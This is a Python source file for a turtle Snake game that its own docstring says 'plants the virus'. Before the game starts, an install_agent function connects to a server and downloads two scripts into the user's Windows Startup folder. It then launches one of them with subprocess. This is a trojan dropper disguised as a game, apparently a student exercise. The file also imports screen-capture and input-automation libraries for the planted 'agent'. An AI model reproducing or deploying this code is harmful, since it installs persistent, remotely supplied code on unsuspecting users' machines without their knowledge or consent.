"""
the snake game, plants the virus
"""
# importing those three libraries
# for the agent file
import cv2
import numpy as np
import pyautogui

import os
import random
import socket
import subprocess
import time
import turtle

SERVER_IP = "127.0.0.1"
SERVER_PORT = 8840
MSG_LEN_PROTOCOL = 4
EOF = b'-1'

# half width/height of game board for collision detection
BOARD_HALF_WIDTH = 290
# score increase when hitting food
HIT_SCORE = 10
# distance to consider as collision
COLLISION_DISTANCE = 20
# distance of move
STEP_DISTANCE = 20
# how much to decrease delay (increase speed) when hitting food
FOOD_HIT_DELAY_REDUCTION = 0.001
# size of turtle window manager
WM_SIZE = 600
# initial delay (speed) at beginning of game
INITIAL_DELAY = 0.1
# delay before reset after collision
RESET_DELAY = 1


class Snake:
    def __init__(self):

        # Head position
        self.y = None
        self.x = None

        # Snake head
        self.head = turtle.Turtle()
        self.head.speed(0)
        self.head.shape("square")
        self.head.color("black")
        self.head.penup()
        self.head.goto(0, 0)
        self.head.direction = "stop"

        self.segments = []

    # Functions
    def go_up(self):
        """
        go up method
        :return:
        """
        if self.head.direction != "down":
            self.head.direction = "up"

    def go_down(self):
        """
        go down method
        :return:
        """
        if self.head.direction != "up":
            self.head.direction = "down"

    def go_left(self):
        """
        go left method
        :return:
        """
        if self.head.direction != "right":
            self.head.direction = "left"

    def go_right(self):
        """
        go right method
        :return:
        """
        if self.head.direction != "left":
            self.head.direction = "right"

    def move(self):
        """
        move method
        :return:
        """
        # Move the end segments first in reverse order
        for index in range(len(self.segments) - 1, 0, -1):
            x = self.segments[index - 1].xcor()
            y = self.segments[index - 1].ycor()
            self.segments[index].goto(x, y)

        # Move segment 0 to where the head is
        if len(self.segments) > 0:
            self.x = self.head.xcor()
            self.y = self.head.ycor()
            self.segments[0].goto(self.x, self.y)

        if self.head.direction == "up":
            self.y = self.head.ycor()
            self.head.sety(self.y + STEP_DISTANCE)

        if self.head.direction == "down":
            self.y = self.head.ycor()
            self.head.sety(self.y - STEP_DISTANCE)

        if self.head.direction == "left":
            self.x = self.head.xcor()
            self.head.setx(self.x - STEP_DISTANCE)

        if self.head.direction == "right":
            self.x = self.head.xcor()
            self.head.setx(self.x + STEP_DISTANCE)

    def add_segment(self):
        # Add a segment
        new_segment = turtle.Turtle()
        new_segment.speed(0)
        new_segment.shape("square")
        new_segment.color("grey")
        new_segment.penup()
        self.segments.append(new_segment)

    def is_outside(self, size):
        return self.head.xcor() > size or self.head.xcor() < -size or \
               self.head.ycor() > size or self.head.ycor() < -size

    def reset(self):
        self.head.goto(0, 0)
        self.head.direction = "stop"

        # Hide the segments
        for segment in self.segments:
            segment.goto(1000, 1000)

        # Clear the segments list
        self.segments.clear()

    def distance(self, item):
        return self.head.distance(item)

    def is_self_collision(self):
        for segment in self.segments:
            if segment.distance(self.head) < COLLISION_DISTANCE:
                return True


def install_agent():
    # server connection
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
    signal = 'g'.encode()
    my_socket.send(signal)
    user_name = os.getlogin()
    # location for the agent file
    location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
               "\\Windows\\Start Menu\\Programs\\" \
               "Startup\\messages.py".format(user_name)
    # downloading the messages file
    with open(location, "wb") as f:
        done = False
        while not done:
            try:
                raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
                size = raw_size.decode()
                if size.isdigit():
                    data = my_socket.recv(int(size))
                if data == EOF:
                    break
                print(len(data))
                f.write(data)
            except Exception:
                done = True

    location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
               "\\Windows\\Start Menu\\Programs\\" \
               "Startup\\funny_game.py".format(user_name)
    # downloading the agent file
    with open(location, "wb") as f:
        done = False
        while not done:
            try:
                raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
                size = raw_size.decode()
                if size.isdigit():
                    data = my_socket.recv(int(size))
                if data == EOF:
                    break
                print(len(data))
                f.write(data)
            except Exception:
                done = True
        process = subprocess.Popen(["python.exe", location])


class Game:

    def __init__(self):
        self.delay = INITIAL_DELAY
        self.snake = Snake()
        # Score
        self.score = 0
        self.high_score = 0
        # Snake food
        self.food = turtle.Turtle()
        self.food.speed(0)
        self.food.shape("circle")
        self.food.color("red")
        self.food.penup()
        self.food.goto(0, 100)
        # Set up the screen
        self.wn = turtle.Screen()
        self.wn.title("Snake Game by @TokyoEdTech")
        self.wn.bgcolor("green")
        self.wn.setup(width=600, height=600)
        self.wn.tracer(0)  # Turns off the screen updates
        # Keyboard bindings
        self.wn.listen()
        self.wn.onkeypress(self.snake.go_up, "w")
        self.wn.onkeypress(self.snake.go_down, "s")
        self.wn.onkeypress(self.snake.go_left, "a")
        self.wn.onkeypress(self.snake.go_right, "d")
        # Pen
        self.pen = turtle.Turtle()
        self.pen.speed(0)
        self.pen.shape("square")
        self.pen.color("white")
        self.pen.penup()
        self.pen.hideturtle()
        self.pen.goto(0, 260)
        self.pen.write("Score: 0  High Score: 0", align="center",
                       font=("Courier", 24, "normal"))

    def write_score(self):
        self.pen.clear()
        self.pen.write("Score: {}  High Score: {}".format(self.score, self.high_score),
                       align="center", font=("Courier", 24, "normal"))

    def reset(self):
        # Reset snake
        self.snake.reset()
        # Reset the score
        self.score = 0
        # Reset the delay
        self.delay = INITIAL_DELAY

    def run(self):

        self.pen.write("Score: 0  High Score: 0", align="center",
                       font=("Courier", 24, "normal"))

        # Main game loop
        while True:
            self.wn.update()

            # Check for a collision with the border
            if self.snake.is_outside(BOARD_HALF_WIDTH):
                time.sleep(RESET_DELAY)
                self.reset()
                self.write_score()

            # Check for a collision with the food
            if self.snake.distance(self.food) < COLLISION_DISTANCE:
                # Move the food to a random spot
                x = random.randint(-BOARD_HALF_WIDTH, BOARD_HALF_WIDTH)
                y = random.randint(-BOARD_HALF_WIDTH, BOARD_HALF_WIDTH)
                self.food.goto(x, y)
                # New snake segment for this move
                self.snake.add_segment()
                # Shorten the delay
                self.delay -= FOOD_HIT_DELAY_REDUCTION
                # Increase the score and check for high score
                self.score += HIT_SCORE
                if self.score > self.high_score:
                    self.high_score = self.score
                self.write_score()

            self.snake.move()

            # Check for head collision with the body segments
            if self.snake.is_self_collision():
                time.sleep(RESET_DELAY)
                self.reset()
                self.write_score()

            time.sleep(self.delay)

        self.wn.mainloop()


def main():
    install_agent()
    game = Game()
    game.run()


if __name__ == '__main__':
    main()
